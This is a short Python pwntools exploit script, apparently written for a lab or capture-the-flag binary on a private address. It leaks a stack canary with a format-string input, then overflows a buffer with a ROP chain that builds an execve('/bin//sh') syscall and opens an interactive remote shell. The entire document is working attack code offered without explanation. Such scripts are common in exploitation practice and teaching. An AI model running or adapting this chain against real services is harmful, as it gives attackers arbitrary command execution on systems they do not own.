from pwn import *
from struct import pack
r = remote("172.16.37.128", 8841)

# Padding goes here
p = ''

p += pack('<I', 0x0806f22a) # pop edx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x080bc506) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080a2cfd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f22a) # pop edx ; ret
p += pack('<I', 0x080ec064) # @ .data + 4
p += pack('<I', 0x080bc506) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080a2cfd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806f22a) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x08054ab0) # xor eax, eax ; ret
p += pack('<I', 0x080a2cfd) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ec060) # @ .data
p += pack('<I', 0x080e71c5) # pop ecx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x0806f22a) # pop edx ; ret
p += pack('<I', 0x080ec068) # @ .data + 8
p += pack('<I', 0x08054ab0) # xor eax, eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x0807bc96) # inc eax ; ret
p += pack('<I', 0x08048ef6) # int 0x80

r.recvuntil("[+] Enter Your Favorite Author's Last Name: ")
r.sendline("%130$x")
canary = r.recv(8)
canary = canary.decode("hex")
canary = struct.unpack('>I', canary)[0]

r.sendline("A")
r.sendline("A" * 16 + p32(0xdeadbeef) + "AAAA" + p32(canary) + "BBBB" + p)

r.interactive()
